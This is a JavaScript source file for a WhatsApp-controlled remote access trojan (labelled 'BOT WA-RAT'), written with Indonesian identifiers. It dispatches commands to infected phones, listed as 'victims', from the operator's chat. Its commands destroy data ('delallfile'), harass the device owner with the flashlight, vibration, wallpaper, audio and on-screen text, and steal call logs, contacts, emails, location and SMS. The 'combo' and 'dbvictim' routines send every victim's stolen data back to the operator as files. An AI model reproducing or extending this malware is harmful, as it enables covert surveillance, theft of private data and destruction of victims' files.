// case.js
const { admin, fs } = require('./module.js');
const {
    tunda,
    apakahKorbanAda,
    kirimPerintahKontrol,
    ambilDanFormatDataSadap,
    ambilSemuaDataKorban
} = require('./sisurya.js');

function dengarkanPerintah(soket, konfig) {
    soket.ev.on('messages.upsert', async (msg) => {
        const pesan = msg.messages[0];
        if (!pesan.message || pesan.key.fromMe) return;
        
        const idObrolan = pesan.key.remoteJid;
        const pengirim = pesan.key.participant || pesan.key.remoteJid;
        
        if (!pengirim.startsWith(konfig.nomorPemilik)) return;

        const kontenPesan = pesan.message.conversation || pesan.message.extendedTextMessage?.text;
        if (!kontenPesan || !/^[./]/.test(kontenPesan)) return;

        const args = kontenPesan.slice(1).trim().split(/ +/);
        const perintahUtama = args.shift().toLowerCase();
        const argPerintah = args.join(' ');

        const setPerintahKontrol = new Set(['flash', 'getaran', 'wallpaper', 'musik', 'delallfile']);
        const setPerintahData = new Set(['baterai', 'riwayattelp', 'kontak', 'merek', 'email', 'spekhp', 'lokasi', 'sms']);

        try {
            if (setPerintahKontrol.has(perintahUtama)) {
                const ip = argPerintah.trim();
                if (!ip) return soket.sendMessage(idObrolan, { text: `❌ Format salah. Gunakan: .${perintahUtama} <ID_KORBAN>` }, { quoted: pesan });
                if (!await apakahKorbanAda(ip, konfig)) return soket.sendMessage(idObrolan, { text: `❌ ID KORBAN ${ip} tidak ditemukan.` }, { quoted: pesan });
                const respon = await kirimPerintahKontrol(ip, perintahUtama);
                await soket.sendMessage(idObrolan, { text: respon }, { quoted: pesan });
                return;
            }

            if (setPerintahData.has(perintahUtama)) {
                const ip = argPerintah.trim();
                if (!ip) return soket.sendMessage(idObrolan, { text: `❌ Format salah. Gunakan: .${perintahUtama} <ID_KORBAN>` }, { quoted: pesan });
                const respon = await ambilDanFormatDataSadap(ip, perintahUtama, konfig);
                await soket.sendMessage(idObrolan, { text: respon }, { quoted: pesan });
                return;
            }

            switch (perintahUtama) {
                case "menusc": {
                    const urlGambar = "https://files.catbox.moe/wkfxep.jpeg";
                    const caption = `╭─── 「  *BOT WA-RAT* 」 ───╮
│
├─  *INFO SESI*
│  ◦  Pemilik: ${konfig.nomorPemilik}
│  ◦  Paket: ${konfig.apakahPremium ? 'Premium' : 'Biasa'}
│
├─  *MENU NAVIGASI*
│  ◦  *.menuv1*
│  ◦  *.menuv2*
│  ◦  *.menuv3*
│  ◦  *.allmenu*
│
├─  *MANAJEMEN KORBAN*
│  ◦  *.listvictim*
│  ◦  *.combo <id>*
│  ◦  *.dbvictim*
│
╰─── 「 Dibuat oleh @SisuryaOfficial 」`;
                    await soket.sendMessage(idObrolan, { image: { url: urlGambar }, caption: caption }, { quoted: pesan });
                    break;
                }
                case "menuv1": {
                    const urlGambar = "https://files.catbox.moe/693kzk.jpg";
                    const caption = `╭─── 「  *MENU KONTROL V1* 」 ───╮
│
├─  *DAFTAR PERINTAH*
│  ◦  *.flash <id>*
│     » Menyalakan senter
│
│  ◦  *.getaran <id>*
│     » Mengirim getaran
│
│  ◦  *.wallpaper <id>*
│     » Mengganti wallpaper
│
│  ◦  *.musik <id>*
│     » Memutar musik
│
│  ◦  *.delallfile <id>*
│     » Menghapus semua file
│
╰─── 「 Format: .<fitur> <id_korban> 」`;
                    await soket.sendMessage(idObrolan, { image: { url: urlGambar }, caption: caption }, { quoted: pesan });
                    break;
                }
                case "menuv2": {
                    const urlGambar = "https://files.catbox.moe/oa9xg0.jpg";
                    const caption = `╭─── 「  *MENU KONTROL V2* 」 ───╮
│
├─  *DAFTAR PERINTAH*
│  ◦  *.teks <teks>,<id>*
│     » Menampilkan teks di layar
│
│  ◦  *.suara <teks>,<id>*
│     » Memutar suara dari teks
│
╰─── 「 Format: .<fitur> <teks>,<id> 」`;
                    await soket.sendMessage(idObrolan, { image: { url: urlGambar }, caption: caption }, { quoted: pesan });
                    break;
                }
                case "menuv3": {
                    const urlGambar = "https://files.catbox.moe/wkfxep.jpeg";
                    const caption = `╭─── 「  *MENU DATA SADAP* 」 ───╮
│
├─  *DAFTAR PERINTAH*
│  ◦  *.baterai <id>* » Info Baterai
│  ◦  *.riwayattelp <id>* » Log Panggilan
│  ◦  *.kontak <id>* » Daftar Kontak
│  ◦  *.merek <id>* » Info Perangkat
│  ◦  *.email <id>* » Daftar Email
│  ◦  *.spekhp <id>* » Spek HP
│  ◦  *.lokasi <id>* » Lacak Lokasi
│  ◦  *.sms <id>* » Baca SMS Lama
│
╰─── 「 Format: .<fitur> <id_korban> 」`;
                    await soket.sendMessage(idObrolan, { image: { url: urlGambar }, caption: caption }, { quoted: pesan });
                    break;
                }
                case "allmenu": {
                    const urlGambar = "https://files.catbox.moe/wkfxep.jpeg";
                    const caption = `╭─── 「  *SEMUA MENU BOT* 」 ───╮
│
├─  *INFO SESI*
│  ◦  Pemilik: ${konfig.nomorPemilik}
│  ◦  Paket: ${konfig.apakahPremium ? 'Premium' : 'Biasa'}
│
├─  *KONTROL V1*
│  ◦  .flash      
│  ◦  .getaran
│  ◦  .wallpaper
│  ◦  .musik
│  ◦  .delallfile
│
├─  *KONTROL V2*
│  ◦  .teks <teks>,<id>
│  ◦  .suara <teks>,<id>
│
├─  *DATA SADAP*
│  ◦  .baterai
│  ◦  .riwayattelp
│  ◦  .kontak
│  ◦  .merek
│  ◦  .email
│  ◦  .spekhp
│  ◦  .lokasi
│  ◦  .sms
│
├─  *MANAJEMEN*
│  ◦  .listvictim
│  ◦  .combo <id>
│  ◦  .dbvictim
│
╰─── 「 Dibuat oleh @SisuryaOfficial 」`;
                    await soket.sendMessage(idObrolan, { image: { url: urlGambar }, caption: caption }, { quoted: pesan });
                    break;
                }
                case "listvictim": {
                    const refDB = admin.database().ref(konfig.pathDB.rat);
                    const snapshot = await refDB.once('value');
                    const data = snapshot.val();
                    if (!data) return soket.sendMessage(idObrolan, { text: "❌ Tidak ada data korban." }, { quoted: pesan });
                    
                    let daftarKorban = "╭─── 「  *DAFTAR KORBAN* 」 ───\n\n";
                    let nomor = 1;
                    Object.values(data).forEach(entri => {
                        daftarKorban += `*Korban ${nomor++}*\n◦ ID: ${entri.ip || 'N/A'}\n◦ Perangkat: ${entri.dev || 'N/A'}\n\n`;
                    });
                    daftarKorban += "╰─── 「 Total: " + (nomor - 1) + " korban 」";
                    await soket.sendMessage(idObrolan, { text: daftarKorban.trim() }, { quoted: pesan });
                    break;
                }
                case "teks":
                case "suara": {
                    const [teks, ip] = argPerintah.split(",").map(s => s.trim());
                    if (!teks || !ip) return soket.sendMessage(idObrolan, { text: `❌ Format salah. Gunakan: .${perintahUtama} <teks>,<ID>` }, { quoted: pesan });
                    if (!await apakahKorbanAda(ip, konfig)) return soket.sendMessage(idObrolan, { text: `❌ ID KORBAN ${ip} tidak ditemukan.` }, { quoted: pesan });
                    
                    const refKontrol = admin.database().ref('/control').push();
                    const kodePerintah = perintahUtama === "teks" ? "toast" : "voi";
                    await refKontrol.set({ com: teks, ha: kodePerintah, ip, key: refKontrol.key });
                    await soket.sendMessage(idObrolan, { text: `✅ Perintah berhasil dikirim, Sensei!` }, { quoted: pesan });
                    break;
                }
                 case "combo": {
                    const ip = argPerintah.trim();
                    if (!ip) return soket.sendMessage(idObrolan, { text: "❌ Format salah. Gunakan: .combo <ID_KORBAN>" }, { quoted: pesan });
                    if (!await apakahKorbanAda(ip, konfig)) return soket.sendMessage(idObrolan, { text: `❌ ID KORBAN ${ip} tidak ditemukan.` }, { quoted: pesan });

                    await soket.sendMessage(idObrolan, { text: `✅ Mode Kombo dimulai untuk ID ${ip}...` }, { quoted: pesan });
                    
                    for (const fitur of ['flash', 'getaran', 'wallpaper', 'musik']) {
                        await kirimPerintahKontrol(ip, fitur);
                        await tunda(2000);
                    }
                    await soket.sendMessage(idObrolan, { text: `✅ Sukses mengirim combo ke korban ${ip}` }, { quoted: pesan });
                    
                    for (const namaData of ['baterai', 'riwayattelp', 'kontak', 'merek', 'email', 'spekhp', 'lokasi', 'sms']) {
                        const respon = await ambilDanFormatDataSadap(ip, namaData, konfig);
                        const namaFile = `${namaData}_${ip}.txt`;
                        fs.writeFileSync(namaFile, respon);
                        await soket.sendMessage(idObrolan, { document: { url: namaFile }, fileName: namaFile, mimetype: 'text/plain', caption: `Data *${namaData}* untuk ID ${ip}` }, { quoted: pesan });
                        fs.unlinkSync(namaFile);
                        await tunda(5000);
                    }
                    await soket.sendMessage(idObrolan, { text: `✅ Mode combo selesai untuk korban ${ip}. Semua data telah dikirim.` }, { quoted: pesan });
                    break;
                }
                case "dbvictim": {
                    const refDB = admin.database().ref(konfig.pathDB.rat);
                    const snapshot = await refDB.once('value');
                    const data = snapshot.val();
                    if (!data) return soket.sendMessage(idObrolan, { text: "❌ Database korban kosong." }, { quoted: pesan });

                    await soket.sendMessage(idObrolan, { text: `✅ Memproses dan mengirim data semua korban...` }, { quoted: pesan });
                    for (const entri of Object.values(data)) {
                        const ip = entri.ip;
                        const kontenFile = await ambilSemuaDataKorban(ip, konfig);
                        if (kontenFile) {
                            const namaFile = `data_lengkap_${ip}.txt`;
                            fs.writeFileSync(namaFile, kontenFile);
                            await soket.sendMessage(idObrolan, { document: { url: namaFile }, fileName: namaFile, mimetype: 'text/plain', caption: `Data lengkap untuk ID ${ip}` }, { quoted: pesan });
                            fs.unlinkSync(namaFile);
                            await tunda(2000);
                        }
                    }
                    await soket.sendMessage(idObrolan, { text: `✅ Semua data korban telah berhasil dikirim.` }, { quoted: pesan });
                    break;
                }
            }
        } catch (err) {
            console.error(chalk.red(`Terjadi galat pada perintah ${perintahUtama}: ${err.message}`));
            await soket.sendMessage(idObrolan, { text: `❌ Terjadi Galat: ${err.message}` }, { quoted: pesan });
        }
    });
}

module.exports = { dengarkanPerintah };